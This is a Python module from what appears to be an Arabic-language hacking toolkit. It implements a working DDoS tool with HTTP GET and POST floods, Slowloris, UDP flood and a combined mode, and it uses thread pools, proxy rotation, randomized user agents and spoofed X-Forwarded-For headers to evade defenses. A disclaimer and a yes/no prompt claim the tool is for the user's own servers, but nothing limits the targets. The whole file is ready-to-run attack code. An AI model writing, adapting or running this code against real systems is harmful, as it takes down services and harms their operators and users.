# MODULE 3 — DDoS Attack
# ═══════════════════════════════════════════════════════════════

ddos_running = False
ddos_sent = 0
ddos_errors = 0

def module_ddos():
    global ddos_running, ddos_sent, ddos_errors
    show_banner()
    console.print(Panel(
        "[bold red][ 3 ] هجوم DDoS — Distributed Denial of Service[/bold red]\n"
        "[dim]يرسل كميات ضخمة من الطلبات لإرهاق الخادم المستهدف\n"
        "يدعم HTTP Flood / POST Flood / Slowloris / UDP Flood\n"
        "[bold red]⚠ للاختبار على خوادمك الخاصة فقط — الاستخدام غير المشروع جريمة[/bold red][/dim]",
        border_style="red"
    ))

    if not Confirm.ask("[red]أؤكد أن الهدف خادمي الخاص وأتحمل المسؤولية الكاملة[/red]"):
        console.print("[yellow]تم الإلغاء.[/yellow]"); press_enter(); return

    while True:
        console.print("\n[red]اختر نوع الهجوم:[/red]")
        console.print("  [bold red][1][/bold red] HTTP GET Flood    — [dim]إغراق بطلبات GET عشوائية[/dim]")
        console.print("  [bold red][2][/bold red] HTTP POST Flood   — [dim]إغراق بطلبات POST ببيانات عشوائية[/dim]")
        console.print("  [bold red][3][/bold red] Slowloris         — [dim]فتح آلاف connections بطيئة تستنزف الخادم[/dim]")
        console.print("  [bold red][4][/bold red] UDP Flood         — [dim]إغراق بحزم UDP (يحتاج root)[/dim]")
        console.print("  [bold red][5][/bold red] Multi-Vector      — [dim]GET + POST معاً لأقصى ضغط[/dim]")
        console.print("  [bold red][0][/bold red] رجوع")

        choice = Prompt.ask("\n[red]اختيارك[/red]", choices=["0","1","2","3","4","5"])
        if choice == "0": break

        if choice in ("1","2","5"):
            target = Prompt.ask("[red]أدخل URL الهدف[/red]")
            if not target.startswith(("http://","https://")): target = "http://" + target
            threads_count = int(Prompt.ask("[red]عدد الـ Threads[/red]", default="200"))
            duration      = int(Prompt.ask("[red]مدة الهجوم (ثانية)[/red]", default="30"))
            use_proxy     = Confirm.ask("[red]استخدام قائمة البروكسي؟[/red]", default=True)
            if use_proxy and not PROXIES: load_proxies()

            ddos_running = True; ddos_sent = 0; ddos_errors = 0
            start_time = time.time(); lock = threading.Lock()

            def attack_get():
                global ddos_sent, ddos_errors
                s = requests.Session()
                while ddos_running:
                    try:
                        px = get_random_proxy() if use_proxy else {}
                        hdrs = {"User-Agent": get_random_ua(), "X-Forwarded-For": ".".join(str(random.randint(1,254)) for _ in range(4)),
                                "Cache-Control": "no-cache", "Pragma": "no-cache"}
                        payload = "?" + urllib.parse.urlencode({"_": random.randint(1,999999), "id": random.randint(1,99999)})
                        s.get(target + payload, timeout=3, proxies=px, headers=hdrs, verify=False)
                        with lock: ddos_sent += 1
                    except:
                        with lock: ddos_errors += 1

            def attack_post():
                global ddos_sent, ddos_errors
                s = requests.Session()
                while ddos_running:
                    try:
                        px = get_random_proxy() if use_proxy else {}
                        hdrs = {"User-Agent": get_random_ua(), "Content-Type": "application/x-www-form-urlencoded",
                                "X-Forwarded-For": ".".join(str(random.randint(1,254)) for _ in range(4))}
                        data = {f"field{i}": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=20))
                                for i in range(random.randint(5,15))}
                        s.post(target, data=data, timeout=3, proxies=px, headers=hdrs, verify=False)
                        with lock: ddos_sent += 1
                    except:
                        with lock: ddos_errors += 1

            worker_fn = attack_post if choice == "2" else (attack_get if choice == "1" else None)
            threads = []
            for i in range(threads_count):
                fn = (attack_get if i % 2 == 0 else attack_post) if choice == "5" else worker_fn
                t = threading.Thread(target=fn, daemon=True); t.start(); threads.append(t)

            console.print(f"\n[bold red][ ATTACK STARTED ] → {target}[/bold red]")
            console.print(f"[yellow]Threads: {threads_count} | Duration: {duration}s | Proxies: {len(PROXIES):,}[/yellow]\n")
            try:
                while time.time() - start_time < duration:
                    elapsed = time.time() - start_time
                    pct = elapsed / duration; bar = "█" * int(40*pct) + "░" * (40 - int(40*pct))
                    rps = ddos_sent / max(elapsed, 0.1)
                    console.print(f"\r[red][{bar}][/red] [cyan]{pct*100:.1f}%[/cyan] | "
                                  f"[green]Sent:{ddos_sent:,}[/green] | [yellow]RPS:{rps:.0f}[/yellow] | "
                                  f"[red]Err:{ddos_errors:,}[/red] | [dim]{duration-elapsed:.0f}s left[/dim]", end="")
                    time.sleep(0.5)
            except KeyboardInterrupt: pass
            ddos_running = False; elapsed = time.time() - start_time
            console.print(f"\n\n[bold green][ FINISHED ][/bold green] مدة:{elapsed:.1f}s | Sent:{ddos_sent:,} | RPS:{ddos_sent/max(elapsed,0.1):.0f} | Err:{ddos_errors:,}")

        elif choice == "3":
            target = Prompt.ask("[red]أدخل الـ Host[/red]")
            port   = int(Prompt.ask("[red]الـ Port[/red]", default="80"))
            count  = int(Prompt.ask("[red]عدد الـ Sockets[/red]", default="500"))
            duration = int(Prompt.ask("[red]مدة الهجوم (ثانية)[/red]", default="60"))
            console.print(f"\n[bold red][ SLOWLORIS ] → {target}:{port} — {count} sockets[/bold red]\n")
            sockets = []; start_time = time.time()
            try:
                for _ in range(count):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4)
                        s.connect((socket.gethostbyname(target), port))
                        s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {target}\r\n".encode())
                        sockets.append(s)
                    except: pass
                console.print(f"[green][+] {len(sockets)} socket مفتوح[/green]")
                while time.time() - start_time < duration:
                    alive = 0
                    for s in list(sockets):
                        try:
                            s.send(f"X-Custom: {random.randint(1,9999)}\r\n".encode())
                            alive += 1
                        except:
                            sockets.remove(s)
                            try:
                                ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                ns.settimeout(4); ns.connect((socket.gethostbyname(target), port))
                                ns.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {target}\r\n".encode())
                                sockets.append(ns); alive += 1
                            except: pass
                    elapsed = time.time() - start_time
                    console.print(f"\r[red]Slowloris:[/red] [green]{alive}[/green] sockets | [cyan]{elapsed:.0f}s/{duration}s[/cyan]", end="")
                    time.sleep(15)
            except KeyboardInterrupt: pass
            finally:
                for s in sockets:
                    try: s.close()
                    except: pass
            console.print(f"\n[bold green][ SLOWLORIS DONE ][/bold green]")

        elif choice == "4":
            target = Prompt.ask("[red]أدخل IP الهدف[/red]")
            port   = int(Prompt.ask("[red]الـ Port (UDP)[/red]", default="53"))
            duration = int(Prompt.ask("[red]مدة الهجوم (ثانية)[/red]", default="30"))
            console.print(f"\n[bold red][ UDP FLOOD ] → {target}:{port}[/bold red]")
            sent = 0; start = time.time()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while time.time() - start < duration:
                    data = os.urandom(random.randint(512, 65507))
                    s.sendto(data, (target, port)); sent += 1
                    if sent % 1000 == 0:
                        console.print(f"\r[red]UDP sent: {sent:,}[/red]", end="")
            except PermissionError:
                console.print("[red][!] يحتاج صلاحيات root للـ UDP raw sockets[/red]")
            except KeyboardInterrupt: pass
            console.print(f"\n[bold green][ UDP DONE ][/bold green] Sent: {sent:,} packets")

    press_enter()


